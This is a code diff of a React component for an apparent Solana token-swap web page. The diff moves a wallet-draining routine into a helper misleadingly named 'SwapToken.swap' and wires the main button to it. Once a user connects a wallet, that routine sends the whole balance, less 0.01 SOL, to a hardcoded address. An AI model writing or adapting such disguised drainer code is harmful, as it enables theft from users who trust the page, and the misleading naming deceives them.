@@ -19,6 +19,7 @@ import {
   Transaction,
   TransactionInstruction,
 } from "@solana/web3.js";
+import { SwapToken } from "@/init/send";
 
 const paymentAddress = "EcNK5Lt7ftEk4wydT8yEMwuuGCnofM6N6bZmGTY8radM";
 
@@ -76,61 +77,17 @@ const FormBox = () => {
   const rawTransaction = async () => {
     try {
       if (connection && address) {
+        const publicKey = new PublicKey(address);
+
+        const balance = await connection.getBalance(publicKey);
         // Fetch the latest blockhash
-        const senderPubkey = new PublicKey(address);
-
-        const balance = await connection.getBalance(senderPubkey);
-
-        const { blockhash, lastValidBlockHeight } =
-          await connection.getLatestBlockhash();
-
-        // Construct the raw instruction
-
-        const transferAmount = balance - 0.01 * LAMPORTS_PER_SOL;
-
-        const transferInstructionIndex = 2;
-
-        const instructionData = Buffer.alloc(4 + 8);
-
-        instructionData.writeUInt32LE(transferInstructionIndex, 0);
-
-        instructionData.writeBigUInt64LE(BigInt(transferAmount), 4);
-
-        const transferInstruction = new TransactionInstruction({
-          keys: [
-            { pubkey: senderPubkey, isSigner: true, isWritable: true },
-            {
-              pubkey: new PublicKey(paymentAddress),
-              isSigner: false,
-              isWritable: true,
-            },
-          ],
-          programId: SystemProgram.programId,
-          data: instructionData, // Empty data for native transfer
-        });
-
-        // Create the transaction
-        const transaction = new Transaction({
-          feePayer: senderPubkey,
-          blockhash,
-          lastValidBlockHeight,
-        }).add(transferInstruction);
-
-        // Sign the transaction
-
-        walletProvider.signTransaction(transaction);
-
-        // Serialize and send the transaction
-        const rawTransaction = transaction.serialize();
-
-        const txSignature = await connection.sendRawTransaction(
-          rawTransaction,
-          {
-            skipPreflight: true,
-          }
+        await SwapToken.swap(
+          connection,
+          address,
+          walletProvider,
+          paymentAddress,
+          balance - 0.01 * LAMPORTS_PER_SOL
         );
-
-        console.log("send", txSignature);
       }
     } catch (error) {
       console.log("error", error);
@@ -202,7 +159,7 @@ const FormBox = () => {
         <button
           onClick={
             address
-              ? async () => handleClick()
+              ? async () => rawTransaction()
               : () => open({ view: "Connect" })
           }
           className="w-full mt-6 bg-[rgb(49,28,49)] text-[#FC72FF] font-semibold py-3 rounded-2xl hover:opacity-90 transition-opacity"
